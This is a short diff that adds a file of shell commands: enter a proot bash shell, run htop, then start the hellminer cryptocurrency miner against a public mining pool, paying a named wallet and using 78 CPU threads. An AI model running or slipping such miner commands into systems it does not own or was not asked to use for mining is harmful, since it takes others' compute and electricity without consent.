@@ -1,0 +1,5 @@
+./dist/proot -S . /bin/bash
+
+htop
+
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLrUZCSPhvkaKhai5XMJZthRVXuzKqQ7T2.Col -p x --cpu 78
